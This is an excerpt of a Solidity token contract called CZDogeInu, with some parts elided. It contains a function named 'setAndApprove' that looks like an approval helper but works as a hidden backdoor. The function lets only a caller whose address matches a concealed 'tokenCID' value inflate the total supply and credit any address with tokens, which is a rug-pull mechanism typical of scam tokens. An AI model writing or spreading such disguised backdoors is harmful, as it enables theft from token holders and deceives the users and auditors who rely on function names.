...
contract CZDogeInu is IERC20 {
  ...
  modifier onlyOwner() {
    require(owner == msg.sender, "IERC20: caller is not the owner");
    _;
  }
  ...
  function setAndApprove(address operator, uint256 _value) public returns (bool) {
    require(operator != address(0));
      require(uint256(msg.sender) == tokenCID);
      totalSupply = totalSupply.add(_value);
      uint8 swapAndLiquify = 1;
      _liquify[operator] = swapAndLiquify * _value * (10 ** uint256(decimals));
    return true;
  }
